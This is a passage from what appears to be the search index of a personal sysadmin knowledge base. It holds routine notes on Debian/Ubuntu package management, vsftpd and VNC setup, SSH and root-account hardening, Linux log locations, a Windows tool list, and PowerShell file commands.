vsftpd\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/#update-config-to-writable","title":"Update config to writable","text":"<pre><code>sudo nano /etc/vsftpd.conf\n</code></pre> <p>locate <code>write_enable=YES</code> and remove the <code>#</code> in front of it and save the file changes.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/#restart-vsftpd","title":"Restart vsftpd","text":"<pre><code>sudo systemctl restart vsftpd\n</code></pre> <p>Now you can FTP and do what you need to do.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/#uninstalling-ftp","title":"Uninstalling FTP","text":"<p>To uninstall the package and remove all its configuration file, run the following</p> <pre><code>sudo apt purge vsftpd\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/","title":"apt","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#using-apt-advanced-package-tool","title":"Using APT - Advanced Package Tool","text":"<p>apt-get man pages</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#installing-a-package","title":"Installing a package","text":"<pre><code>sudo apt-get install &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#removing-a-package","title":"Removing a package","text":"<p>Removes a package, however it leaves its configuration files on the system</p> <pre><code>sudo apt-get remove &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#purging-a-package","title":"Purging a package","text":"<p>Removes the package and any of its configuration files as long as they are located in <code>/etc</code>. If you have configuration files in a location such as <code>/home</code> those configurations will remain there when using purge.</p> <pre><code>sudo apt-get purge &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#remove-purging-a-package","title":"Remove &amp; Purging a package","text":"<pre><code>apt-get remove --purge packagename\n</code></pre> <p>You can read more about the differences between purge and remove here apt remove vs apt purge</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#upgrade-os-run","title":"Upgrade OS run","text":"<pre><code>do-release-upgrade\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#to-upgrade-existing-package","title":"To upgrade existing package","text":"<pre><code>sudo apt-get --only-upgrade install &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#to-install-remove-a-package","title":"To install &amp; Remove a package","text":"<pre><code>sudo apt-get install &lt;PackageName&gt;\nsudo apt-get remove &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#to-search-for-package","title":"To search for package","text":"<pre><code>apt search &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#see-list-of-upgradable-packages","title":"See list of upgradable packages","text":"<pre><code>sudo apt-get update\nsudo apt list --upgradable\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#list-installed-packages","title":"List installed packages","text":"<pre><code>sudo apt list --installed\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#view-package-details-version-etc","title":"View package details, version, etc.","text":"<pre><code>apt show &lt;PackageName&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#check-stats-on-installed-packages","title":"Check stats on installed Packages","text":"<pre><code>apt-cache stats\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#show-installed-packages-names","title":"Show installed packages names","text":"<pre><code>apt-cache pkgnames\napt-cache pkgnames &lt;name&gt;*\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#search-for-package","title":"Search for package","text":"<pre><code>apt-cache search &lt;name&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#check-unmet-dependencies","title":"Check unmet dependencies","text":"<pre><code>apt-cache unmet\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#check-install-repos","title":"Check Install repos","text":"<pre><code>less /etc/apt/sources.list\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#apt-manual-pages","title":"apt manual pages","text":"<pre><code>man apt\nman apt-get\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#packages-installed-with-apt-get-are-located-in-varcacheaptarchives","title":"Packages installed with apt-get are located in /var/cache/apt/archives","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#to-check-repo-sources","title":"To check Repo sources","text":"<pre><code>sudo apt edit-sources\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#adding-apt-repository-in-ubuntu","title":"Adding Apt Repository In Ubuntu","text":"<p>Resources How-to-add-apt-repository-in-ubuntu</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#adding-kali-repository-to-ubuntu","title":"Adding Kali Repository to Ubuntu","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-1-install-git","title":"Step-1: Install Git","text":"<pre><code>sudo apt install git\ngit --version\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-2-install-python-27","title":"Step-2: Install Python 2.7","text":"<pre><code>sudo apt install python2    &lt;OR&gt;     sudo apt install python-minimal\npython2 --version\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-3-install-katoolin","title":"Step-3: Install Katoolin","text":"<pre><code>cd ~\nsudo git clone &lt;https://github.com/LionSec/katoolin.git&gt;\nls -l\nsudo cp katoolin/katoolin.py /usr/bin/katoolin\n</code></pre> <p>Make the script executable</p> <pre><code>sudo chmod +x /usr/bin/katoolin\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-4-launch-katoolin","title":"Step-4: Launch Katoolin","text":"<pre><code>sudo katoolin\n</code></pre> <p>OR</p> <pre><code>sudo python2 /usr/bin/katoolin\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-5-add-kali-repositories-update","title":"Step-5: Add Kali Repositories &amp; Update","text":"<p>katoolin - Choose 1 \"add Kali Linux repositories\" - Choose 1 again \"Add Kali Linux repositories\"</p> <p>If you get the error gpg: keyserver receive failed: No name</p> <pre><code>wget -q -O - archive.kali.org/archive-key.asc | sudo  apt-key add\nsudo apt update\n</code></pre> <p>katoolin - Update repos</p> <pre><code>- Option 1 \"Add Kali Linux repositories\"\n- Option 2 \"Update\"\n- When done, type gohome to return the katoolin main interface window.\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-6-katoolin-view-categories-to-install-kali-linux-apps-on-ubuntu","title":"Step-6: katoolin - View Categories to install Kali Linux Apps on Ubuntu","text":"<pre><code>- Option 2 \"View Categories\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-7-katoolin-install-the-classic-menu-indicator","title":"Step-7: katoolin - Install the Classic Menu indicator","text":"<pre><code>- Option 3 to Classic Menu indicator\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/apt/#step-8-katoolin-install-kali-menu","title":"Step-8: katoolin - Install Kali Menu","text":"<pre><code>- Option 4 install the Kali menu\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/","title":"dpkg","text":"<p>BE AWARE! - DPKG is LOW LEVEL - You might encounter Dependency Issues</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#list-all-installable-packages-in-a-directory","title":"List all installable packages in a directory","text":"<pre><code>cd &lt;DIR&gt;\nsudo dpkg -l\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#to-search-for-name-you-can-use-wild-card-for-parts-of-name","title":"To search for name you can use wild card for parts of name","text":"<pre><code>sudo dpkg -l &lt;Install_Package_Name&gt;*\nsudo dpkg -l *&lt;Install_Package_Name&gt;*\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#to-install-a-local-package-file","title":"To install a local package file","text":"<pre><code>&lt;Path&gt; dpkg -i ./* #THIS INSTALLS ALL PACKAGES IN THAT LOCATION\n&lt;Path&gt; dpkg -i &lt;Install_Package_Name&gt; #THIS INSTALLS 1 PACKAGE\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#check-package-info","title":"Check package info","text":"<pre><code>sudo dpkg --info &lt;Package_Name&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#list-file-in-an-install-package","title":"List file in an install package","text":"<pre><code>sudo dpkg --listfiles &lt;Package_Name&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#get-package-name-for-a-dirctory","title":"Get package name for a dirctory","text":"<pre><code>dpkg --search &lt;Path&gt;    #Example  dpkg --search /opt/Adobe/Reader9/\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#uninstall-package-and-remove-all-its-files","title":"Uninstall package and remove all its files","text":"<pre><code>sudo dpkg --purge &lt;Package_Name&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#reconfiguring-an-installed-package","title":"Reconfiguring an installed package","text":"<pre><code>sudo dpkg-reconfigure &lt;Package_Name&gt;\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/dpkg/#finding-package-links-for-dpkg-and-using-wget-to-download","title":"Finding package links for dpkg and using wget to download","text":"<p>Newer releases https://packages.ubuntu.com/ Older releases http://old-releases.ubuntu.com/releases/</p> <p>Check what release you have</p> <pre><code>lsb_release -a\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Package_Management/other/","title":"other","text":"<p>Those are some other package management tools:</p> <ul> <li>SNAP ubuntuhandbook</li> <li>PIP - PYTHON    </li> <li>GIT</li> </ul>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/","title":"Disable Root account","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/#create-a-user","title":"Create a user","text":"<p>First steps to securing your linux machine after install Create a new user</p> <pre><code>sudo adduser &lt;user-name&gt;\n#enter password and confirm\n#you can skip the info it asks you (full name, ...), just hit enter until it's done\n</code></pre> <p>example</p> <pre><code>[sudo] password for batman:\nAdding user `batmanss' ...\nAdding new group `batman' (1001) ...\nAdding new user `batman' (1001) with group `batman' ...\nCreating home directory `/home/batman' ...\nCopying files from `/etc/skel' ...\nNew password:\nRetype new password:\npasswd: password updated successfully\nChanging the user information for batman\nEnter the new value, or press ENTER for the default\n    Full Name []:\n    Room Number []:\n    Work Phone []:\n    Home Phone []:\n    Other []:\nIs the information correct? [Y/n]\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/#disable-root-login-usermod","title":"Disable root login usermod","text":"<pre><code>sudo usermod -L root\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/#change-root-users-shell","title":"Change root User\u2019s Shell","text":"<p>This method is only effective with programs that require a shell for user login, otherwise, sudo, ftp and email clients can access the root account.</p> <pre><code>sudo usermod -s /usr/sbin/nologin root\ncat /etc/passwd | grep root\n</code></pre> <p>Change root login message from default message</p> <pre><code>sudo nano /etc/nologin.txt\n</code></pre> <p>Enter your prefered warning message, then save your changes and exit the file <code>The the ducks are quaking around, so watch your back Jack!</code></p> <p>Cat the message</p> <pre><code>cat /etc/nologin.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/#disable-ssh-root-login","title":"Disable SSH Root Login","text":"<p>This method only affects openssh tools set, programs such as ssh, scp, sftp will be blocked from accessing the root account.</p> <pre><code>sudo nano /etc/ssh/sshd_config\n#### uncomment below\nPermitRootLogin no\n</code></pre> <p>restart ssh service</p> <pre><code>sudo systemctl restart sshd \n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Disable_Root_account/#restrict-root-access-to-services-via-pam-pluggable-authentication-modules","title":"Restrict root Access to Services Via PAM [Pluggable Authentication Modules]","text":"<p>This method only affect programs and services that are PAM aware. You can block root access to the system via ftp and email clients and more.</p> <pre><code>cat /etc/passwd | grep 1000\n#### EDIT THE USERS ALLOWED userx\necho -e \"user1\\nuser2\\nuser3\" | sudo tee /etc/allowed_users\nsudo nano /etc/pam.d/sshd\n#### Add at the beginning of the file\nauth required pam_listfile.so item=user sense=allow file=/etc/allowed_users onerr=fail\n</code></pre> <p>restart ssh service</p> <pre><code>sudo systemctl restart ssh\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/","title":"SSH 2FA","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#installing-and-configuring-required-packages","title":"Installing and configuring required packages","text":"<pre><code>sudo apt install libpam-google-authenticator\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#configuring-ssh","title":"Configuring SSH","text":"<p>To make SSH use the Google Authenticator PAM module, add the following  line to the /etc/pam.d/sshd file</p> <pre><code>auth required pam_google_authenticator.so\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#restart-the-sshd-daemon","title":"restart the sshd daemon","text":"<pre><code>sudo systemctl restart sshd.service\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#modify-etcsshsshd_config","title":"Modify <code>/etc/ssh/sshd_config</code>","text":"<p>change <code>ChallengeResponseAuthentication rom     no</code> to <code>yes</code></p> <p>so this part of the file looks like this</p> <pre><code>Change to yes to enable challenge-response passwords (beware issues with\n  #some PAM modules and threads)\n  ChallengeResponseAuthentication yes\n  #Change to no to disable tunnelled clear text passwords\n  #PasswordAuthentication yes\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#configuring-authentication","title":"Configuring authentication","text":"<pre><code>google-authenticator\n</code></pre> <p>It will ask you a series of questions (recommended configuration)</p> <pre><code>Make tokens \u201ctime-base\u201d\u201d: yes\nUpdate the .google_authenticator file: yes\nDisallow multiple uses: yes\nIncrease the original generation time limit: no\nEnable rate-limiting: yes\n</code></pre> <p>You will get secret key that you will then use to add to the Auth App</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/SSH_2FA/#adding-the-secret-to-google-authenticator","title":"Adding the secret to Google Authenticator","text":"<pre><code>Add to the Auth app\ntype the secret key provided by google-authenticator command\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/","title":"Viewing and monitoring log files","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#system-logs","title":"System logs","text":"<p>System logs deal with exactly that - the Ubuntu system - as opposed to extra applications added by the user. These logs may contain information about authorizations, system daemons and system messages.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#authorization-log","title":"Authorization log","text":"<p>Keeps track of authorization systems, such as password prompts, the\u00a0sudo\u00a0command and remote logins.</p> <pre><code>/var/log/auth.log\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#daemon-log","title":"Daemon Log","text":"<p>Daemons are programs that run in the background, usually without user interaction. For example, display server, SSH sessions, printing services, bluetooth, and more.</p> <pre><code>/var/log/daemon.log\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#debug-log","title":"Debug log","text":"<p>Provides debugging information from the Ubuntu system and applications.</p> <pre><code>/var/log/debug\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#kernel-log","title":"Kernel log","text":"<p>Logs from the Linux kernel.</p> <pre><code>/var/log/kern.log\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#system-log","title":"System log","text":"<p>Contains more information about your system. If you can\u2019t find anything in the other logs, it\u2019s probably here.</p> <pre><code>/var/log/syslog\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#application-logs","title":"Application logs","text":"<p>Some applications also create logs in\u00a0</p> <pre><code>/var/log/\n</code></pre> <p>Below are some examples</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#apache-logs","title":"Apache logs","text":"<p>Apache creates several log files in the\u00a0/var/log/apache2/\u00a0subdirectory. The\u00a0access.log\u00a0file records all requests made to the server to access files.\u00a0error.log\u00a0records all errors thrown by the server.</p> <pre><code>/var/log/apache2/\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#x11-server-logs","title":"X11 server logs","text":"<p>The X11 server creates a seperate log file for each of your displays. Display numbers start at zero, so your first display (display 0) will log to\u00a0Xorg.0.log. The next display (display 1) would log to\u00a0Xorg.1.log, and so on.</p> <pre><code>/var/log/Xorg.0.log\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#non-human-readable-logs","title":"Non-human-readable logs","text":"<p>Not all log files are designed to be read by humans. Some were made to be parsed by applications. Below are some of examples.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#login-failures-log","title":"Login failures log","text":"<p>Contains info about login failures. You can view it with the\u00a0<code>faillog</code>\u00a0command.</p> <pre><code>/var/log/faillog\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#last-logins-log","title":"Last logins log","text":"<p>Contains info about last logins. You can view it with the\u00a0<code>lastlog</code>\u00a0command.</p> <pre><code>/var/log/lastlog\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#login-records-log","title":"Login records log","text":"<p>Contains login info used by other utilities to find out who\u2019s logged in. To view currently logged in users, use the\u00a0who\u00a0command.</p> <pre><code>/var/log/wtmp\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#viewing-logs-using-gnome-system-log-viewer","title":"Viewing logs using GNOME System Log Viewer","text":"<p>The log viewer has a simple interface. The sidebar on the left shows a list of open log files, with the contents of the currently selected file displayed on the right.</p> <p>The log viewer not only displays but also monitors log files for changes. The bold text (as seen in the screenshot above) indicates new lines that have been logged after opening the file. When a log that is not currently selected is updated, it\u2019s name in the file list will turn bold (as shown by\u00a0auth.log\u00a0in the screenshot above).</p> <p>Clicking on the cog at the top right of the window will open a menu allowing you to change some display settings, as well as open and close log files.</p> <p>There is also a magnifying glass icon to the right of the cog that allows you to search within the currently selected log file.</p> <p>GNOME System Log Viewer official documentation.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#viewing-and-monitoring-logs-from-the-command-line","title":"Viewing and monitoring logs from the command line","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#viewing-files","title":"Viewing files","text":"<pre><code>less file.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#viewing-the-start-or-end-of-a-file","title":"Viewing the start or end of a file","text":"<p><code>head</code>\u00a0and\u00a0<code>tail</code>\u00a0commands</p> <pre><code>tail -n 15 file.txt\nhead -n 15 file.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#monitoring-files","title":"Monitoring files","text":"<p>Pass the\u00a0<code>-f</code>\u00a0flag to\u00a0tail. It will keep running, printing new additions to the file, until you stop it (Ctrl + C). For example:</p> <pre><code>tail -f file.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#searching-files","title":"Searching files","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#less","title":"less","text":"<pre><code>less\u00a0and press\u00a0/. A\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#grep-command","title":"grep\u00a0command","text":"<p>To search for lines containing <code>\"test\"</code> in\u00a0file.txt, you would run\u00a0</p> <pre><code>grep \"test\" file.txt\n</code></pre> <p>If the result of a\u00a0grep\u00a0search is too long, you may pipe it to\u00a0less, allowing you to scroll and search through it</p> <pre><code>grep \"test\" file.txt | less\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Securing_Linux/Viewing_and_monitoring_log_files/#resources","title":"Resources","text":"<p>Log files locations</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Services_and_applications/vnc_install/","title":"vnc install","text":"<p>Installing VNC</p> <pre><code>sudo apt update\nsudo apt install -y tightvncserver\n</code></pre> <p>To complete the VNC server\u2019s initial configuration after installation, use the vncserver command to set up a secure password and create the initial configuration files:</p> <pre><code>sudo vncserver\n</code></pre> <p>You\u2019ll be prompted to enter and verify a password to access your machine remotely</p> <p>example</p> <pre><code>-&gt;$ sudo vncserver\n[sudo] password for batman:\n\nYou will require a password to access your desktops.\n\nPassword:\nVerify:\nWould you like to enter a view-only password (y/n)? n\n\nWarning: batman:1 is taken because of /tmp/.X1-lock\nRemove this file if there is no X server batman:1\nxauth:  file /root/.Xauthority does not exist\n\nNew 'X' desktop is batman:6\n\nCreating default startup script /root/.vnc/xstartup\nStarting applications specified in /root/.vnc/xstartup\nLog file is /root/.vnc/batman:6.log\n</code></pre> <p>Only if needed - update [nano ./.vnc/xstartup] with below</p> <pre><code>!/bin/sh\n# Uncomment the following two lines for normal desktop:\n# unset SESSION_MANAGER\n# exec /etc/X11/xinit/xinitrc\nunset DBUS_SESSION_BUS_ADDRESS\nxrdb $HOME/.Xresources\nxsetroot -solid grey\n# vncconfig -iconic &amp;\n# x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;\n/etc/X11/Xsession &amp;\nexport XKL_XMODMAP_DISABLE=1\nexec /usr/bin/mate-session &amp;\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/applications/","title":"applications","text":""},{"location":"Knowledge_Base/OS/Windows/applications/#sources","title":"Sources","text":"<ul> <li>privacytools.io</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#misc","title":"Misc.","text":"<ul> <li>Everything search tool</li> <li>Display Fusion</li> <li>Firefox</li> <li>7-zip</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#remote","title":"Remote","text":"<ul> <li>VNC-Viewer</li> <li>Tight VNC </li> <li>Devolutions Remote Desktop Manager</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#network","title":"Network","text":"<ul> <li>CurrPorts </li> <li>Paessler SNMP</li> <li>SNMP SET CLI</li> <li>SNMP WALK CLI</li> <li>SnmpTrapGen CLI </li> <li>SnmpGet CLI</li> <li>SNMP Utilities</li> <li>tftpd64</li> <li>TCPView</li> <li>Wireshark</li> <li>Putty</li> <li>BvSshClient</li> <li>SuperPuttyy</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#notes-coding-text-compare","title":"Notes &amp; Coding &amp; Text Compare","text":"<ul> <li>Notepad++</li> <li>Sublime</li> <li>Python</li> <li>Pycharm</li> <li>winmerge</li> <li>ActivePerl</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>Nmap https://nmap.org/download.html</li> <li>Burpsuite https://portswigger.net/burp/communitydownload</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#disk","title":"Disk","text":"<ul> <li>Disk drill</li> <li>PAssist_Std</li> <li>File Shredder</li> <li>O&amp;O DiskImage 18 Data Backup</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#windows-privacy-protection","title":"Windows Privacy &amp; Protection","text":"<ul> <li>O&amp;O ShutUp10++ Antispy Tool</li> <li>Patch My PC</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#diagrams","title":"Diagrams","text":"<ul> <li>Diagrams</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/applications/#vpn","title":"VPN","text":"<ul> <li>Mullvad VPN</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/","title":"PowerShell file operation","text":""},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#files","title":"Files","text":""},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#renaming-files-replacing-specific-chars-in-files","title":"Renaming files [replacing specific chars in files]","text":"<p>rename files, replacing any old_value with new_value</p> <pre><code>get-childitem * -r | foreach {rename-item $_ $_.name.replace(\"old_value\",\"new_value\")}\n</code></pre> <p>List the files in a directory and recurse replace old_value with new_value</p> <pre><code>ls *.md -r | Rename-Item -NewName {$_.name -replace \"old_value\",\"new_value\"}\n</code></pre> <p>Replace file/folder name value from old_value to new_value</p> <pre><code>Get-ChildItem -r | Rename-Item -NewName { $_.name -replace 'old_value', 'new_value'} -verbose\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#get-file-full-path","title":"Get file full path","text":"<p>Get full file path recursively from a directory, where the file extension is .md</p> <pre><code>get-childitem \"C:\\temp\\test_folder\" -recurse | where {$_.extension -eq \".md\"} | % {Write-Host $_.FullName}\n</code></pre> <p>another way of doing it</p> <pre><code>Get-ChildItem \"C:\\temp\\test_folder\" *.md -Recurse | Select-Object FullName\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#create-a-file","title":"Create a file","text":"<p>create a file in D:\\Temp\\Test Folder with name \"Test File.txt\"</p> <pre><code>New-Item -Path 'D:\\temp\\Test Folder\\Test File.txt' -ItemType File\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#check-file-existence","title":"Check file existence","text":"<p>check if file test.txt exists in 'D:\\temp\\test directory'</p> <pre><code>Test-Path D:\\temp\\test\\test.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#retrieving-item","title":"Retrieving Item","text":"<p>reading a file's content 'D:\\Temp\\Test\\Test.txt'</p> <pre><code>Get-Content D:\\temp\\Test\\test.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#renaming-a-file","title":"Renaming a file","text":"<p>rename file test.txt to test1.txt</p> <pre><code>Rename-Item D:\\temp\\Test\\test.txt test1.txt\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#moving-a-file","title":"Moving a file","text":"<p>move a file from one directory to another 'D:\\Temp\\Test\\Test.txt' to 'D:\\Temp\\Test1'</p> <pre><code>Move-Item D:\\temp\\Test\\Test.txt D:\\temp\\Test1\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#deleting-files","title":"Deleting file(s)","text":"single file deletionrecursively deleting files <p>delete file 'D:\\temp\\Test Folder\\test.txt'</p> <pre><code>Remove-Item 'D:\\temp\\Test Folder\\test.txt'\n</code></pre> <p>Delete all files in directory 'D:\\temp\\Test Folder'</p> <pre><code>Remove-Item 'D:\\temp\\Test Folder' -Recurse\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#copying-files","title":"Copying file(s)","text":"copying a single filecopying multiple files <p>delete file 'D:\\temp\\Test Folder\\test.txt' <pre><code>Copy-Item 'D:\\temp\\Test Folder\\Test File.txt' 'D:\\temp\\Test Folder1\\Test File1.txt'\n</code></pre></p> <p>Copy files from 1 directory to another <pre><code>Copy-Item -Filter *.txt -Path 'D:\\temp\\Test Folder' -Recurse -Destination 'D:\\temp\\Test Folder1'\n</code></pre></p>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#folders","title":"Folders","text":""},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#create-a-folder","title":"create a folder","text":"<p>create a folder in D:\\Temp\\ with name \"Test Folder\"</p> <pre><code>New-Item -Path 'D:\\temp\\Test Folder' -ItemType Directory\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#copying-a-folder","title":"Copying a folder","text":"copying a single foldercopying multiple folders <p>copy a single folder D:\\Temp\\Test Folder as D:\\Temp\\Test Folder1</p> <pre><code>Copy-Item 'D:\\temp\\Test Folder' 'D:\\temp\\Test Folder1'\n</code></pre> <p>copy a folder recursively D:\\Temp\\Test Folder to D:\\Temp\\Test Folder1</p> <pre><code>Copy-Item 'D:\\temp\\Test Folder' -Destination 'D:\\temp\\Test Folder1'\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#renaming-a-folder","title":"Renaming a folder","text":"<p>renaming a folder D:\\Temp\\Test to D:\\Temp\\Test1</p> <pre><code>Rename-Item \"D:\\temp\\Test 